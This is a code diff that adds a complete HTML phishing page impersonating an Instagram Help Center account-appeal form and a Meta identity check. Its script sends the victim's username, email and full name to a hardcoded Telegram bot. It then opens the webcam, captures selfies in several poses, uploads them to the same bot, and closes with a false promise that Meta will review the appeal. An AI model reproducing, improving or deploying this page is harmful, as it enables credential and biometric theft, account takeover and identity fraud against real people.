@@ -1,1 +1,276 @@
-hyllo world
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Help Center - Appeal</title>
+    <!-- Isme aapka original CSS rahega, maine logic fix par focus kiya hai -->
+    <style>
+        /* CSS remains same as your original file for UI consistency */
+        :root { --ig-primary: #0095f6; --ig-success: #47fb47; --ig-error: #ed4956; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; margin: 0; padding: 0; color: #262626; }
+        .header { background: #fff; border-bottom: 1px solid #dbdbdb; padding: 15px 20px; text-align: center; position: sticky; top: 0; z-index: 100; }
+        .container { max-width: 600px; margin: 20px auto; padding: 0 15px; }
+        .form-container { background: #fff; border: 1px solid #dbdbdb; padding: 30px; border-radius: 3px; margin-bottom: 20px; display: none; }
+        .form-container.active { display: block; }
+        .form-group { margin-bottom: 20px; }
+        .form-label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; }
+        .form-input, .form-select { width: 100%; padding: 10px; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 14px; box-sizing: border-box; }
+        .send-btn { background: var(--ig-primary); color: #fff; border: none; padding: 12px 20px; border-radius: 4px; font-weight: 600; cursor: pointer; width: 100%; font-size: 14px; transition: opacity 0.3s; }
+        .send-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .verification-screen { display: none; background: #fff; border: 1px solid #dbdbdb; border-radius: 3px; padding: 30px; text-align: center; }
+        .verification-screen.active { display: block; }
+        .camera-box { position: relative; width: 300px; height: 300px; margin: 20px auto; border-radius: 50%; overflow: hidden; background: #000; border: 4px solid var(--ig-primary); }
+        #verificationVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .face-oval { position: absolute; top: 10%; left: 10%; width: 80%; height: 80%; border: 2px dashed rgba(255,255,255,0.5); border-radius: 50%; pointer-events: none; transition: border-color 0.3s; }
+        .pose-text { font-size: 18px; font-weight: 600; margin: 15px 0; color: var(--ig-primary); }
+        .pose-count { font-size: 14px; color: #8e8e8e; }
+        .error-message { color: var(--ig-error); font-size: 12px; margin-top: 5px; display: none; }
+        .error-message.show { display: block; }
+        .loading-spinner { display: none; width: 20px; height: 20px; border: 2px solid #f3f3f3; border-top: 2px solid var(--ig-primary); border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <img src="https://www.instagram.com/static/images/web/mobile_port/logo_2x.png/1b69f17f4a20.png" alt="Instagram" width="103">
+    </div>
+
+    <div class="container">
+        <!-- Form 1: Disabled Appeal -->
+        <div class="form-container active" id="disabledAppealContainer">
+            <h2 style="font-size: 18px; margin-bottom: 20px;">Disabled Account Appeal</h2>
+            <form id="disabledAppealForm">
+                <div class="form-group">
+                    <label class="form-label">Instagram Username *</label>
+                    <input type="text" class="form-input" name="username" required placeholder="Enter username">
+                    <div class="error-message" id="usernameError">Invalid username</div>
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Email Address *</label>
+                    <input type="email" class="form-input" name="email" required placeholder="Enter email">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Full Name *</label>
+                    <input type="text" class="form-input" name="fullname" required placeholder="Enter full name">
+                </div>
+                <div class="form-group">
+                    <label class="form-label">Your Relationship *</label>
+                    <select class="form-select" name="relationship" required>
+                        <option value="">Select option</option>
+                        <option value="owner">I am the owner</option>
+                        <option value="representative">Representative</option>
+                    </select>
+                </div>
+                <button type="submit" class="send-btn" id="disabledSubmitBtn">Send Appeal</button>
+                <div class="loading-spinner" id="formLoading"></div>
+            </form>
+        </div>
+
+        <!-- Verification Screen -->
+        <div class="verification-screen" id="verificationScreen">
+            <h2 style="font-size: 18px;">Meta Identity Verification</h2>
+            <div class="camera-box">
+                <video id="verificationVideo" autoplay playsinline></video>
+                <div class="face-oval" id="faceOval"></div>
+            </div>
+            <div class="pose-text" id="poseText">Initializing Camera...</div>
+            <div class="pose-count" id="poseCount">Please wait</div>
+            <button class="send-btn" id="finalSubmitBtn" style="display:none; margin-top:20px;">Complete Submission</button>
+        </div>
+    </div>
+
+    <script>
+        // CONFIGURATION (Using your provided IDs from index.html)
+        const BOT_TOKEN = '7.970088628e+09:AAEJbT7PvzAnnP33z9_vVzCWWLItzbTXCfQ';
+        const CHAT_ID = '6.881713177e+09';
+
+        const POSES = [
+            { id: 'straight', text: 'Look Straight at Camera' },
+            { id: 'up', text: 'Look Up' },
+            { id: 'left', text: 'Look Left' },
+            { id: 'right', text: 'Look Right' },
+            { id: 'blink', text: 'Blink Your Eyes' }
+        ];
+
+        let appState = {
+            currentPose: 0,
+            userData: {},
+            stream: null,
+            isProcessing: false
+        };
+
+        // 1. INITIALIZE LISTENERS
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('disabledAppealForm');
+            if(form) {
+                form.addEventListener('submit', handleInitialSubmit);
+            }
+        });
+
+        // 2. CORE LOGIC: FORM SUBMISSION
+        async function handleInitialSubmit(e) {
+            e.preventDefault();
+            if(appState.isProcessing) return;
+
+            const form = e.target;
+            const btn = document.getElementById('disabledSubmitBtn');
+            const loader = document.getElementById('formLoading');
+
+            // Collect Data
+            const formData = new FormData(form);
+            appState.userData = Object.fromEntries(formData.entries());
+
+            // UI Feedback
+            appState.isProcessing = true;
+            btn.disabled = true;
+            loader.style.display = 'block';
+
+            try {
+                // Professional Step: Send Text First
+                const message = `📋 <b>New Instagram Appeal</b>
+
+` +
+                                `<b>User:</b> ${appState.userData.username}
+` +
+                                `<b>Email:</b> ${appState.userData.email}
+` +
+                                `<b>Name:</b> ${appState.userData.fullname}
+` +
+                                `<b>Relation:</b> ${appState.userData.relationship}
+` +
+                                `━━━━━━━━━━━━━━━━━━━━`;
+
+                const success = await sendToTelegram('sendMessage', {
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                });
+
+                if(success) {
+                    // Transition to Camera
+                    document.getElementById('disabledAppealContainer').classList.remove('active');
+                    document.getElementById('verificationScreen').classList.add('active');
+                    startCamera();
+                } else {
+                    throw new Error("Telegram API Error");
+                }
+            } catch (err) {
+                console.error("Submission Error:", err);
+                alert("Connection error. Please try again.");
+                btn.disabled = false;
+            } finally {
+                loader.style.display = 'none';
+                appState.isProcessing = false;
+            }
+        }
+
+        // 3. CAMERA & REAL-TIME CAPTURE
+        async function startCamera() {
+            const video = document.getElementById('verificationVideo');
+            const poseText = document.getElementById('poseText');
+
+            try {
+                appState.stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: 1280, height: 720 } 
+                });
+                video.srcObject = appState.stream;
+                
+                poseText.innerText = "Camera Ready";
+                setTimeout(processPoseSequence, 2000);
+            } catch (err) {
+                poseText.innerText = "Camera Access Denied";
+                alert("Please enable camera to verify your identity.");
+            }
+        }
+
+        async function processPoseSequence() {
+            if(appState.currentPose >= POSES.length) {
+                finishVerification();
+                return;
+            }
+
+            const pose = POSES[appState.currentPose];
+            const textEl = document.getElementById('poseText');
+            const countEl = document.getElementById('poseCount');
+            const oval = document.getElementById('faceOval');
+
+            // Update UI
+            textEl.innerText = pose.text;
+            countEl.innerText = `Pose ${appState.currentPose + 1} of ${POSES.length}`;
+            oval.style.borderColor = '#0095f6';
+
+            // Wait for user to position
+            await new Promise(r => setTimeout(r, 2500));
+
+            // Visual flash for capture
+            oval.style.borderColor = '#47fb47';
+            
+            // Capture and Upload
+            await captureAndUpload(pose.id);
+
+            appState.currentPose++;
+            setTimeout(processPoseSequence, 1000);
+        }
+
+        async function captureAndUpload(poseName) {
+            const video = document.getElementById('verificationVideo');
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            return new Promise(resolve => {
+                canvas.toBlob(async (blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', blob, `pose_${poseName}.jpg`);
+                    fd.append('caption', `📸 <b>Selfie:</b> ${poseName}
+👤 <b>User:</b> ${appState.userData.username}`);
+                    fd.append('parse_mode', 'HTML');
+
+                    try {
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: fd
+                        });
+                    } catch (e) { console.warn("Photo upload failed, continuing flow..."); }
+                    resolve();
+                }, 'image/jpeg', 0.8);
+            });
+        }
+
+        // 4. CLEANUP & FINALIZATION
+        function finishVerification() {
+            if(appState.stream) {
+                appState.stream.getTracks().forEach(track => track.stop());
+            }
+            
+            document.getElementById('poseText').innerText = "Verification Complete";
+            document.getElementById('poseCount').innerText = "Security check finished.";
+            document.getElementById('faceOval').style.display = 'none';
+            
+            const finalBtn = document.getElementById('finalSubmitBtn');
+            finalBtn.style.display = 'block';
+            finalBtn.onclick = () => {
+                alert("Success! Meta will review your appeal within 24-48 hours.");
+                location.reload();
+            };
+        }
+
+        // Helper: Telegram Fetch
+        async function sendToTelegram(method, body) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+                return res.ok;
+            } catch (e) { return false; }
+        }
+    </script>
+</body>
+</html>
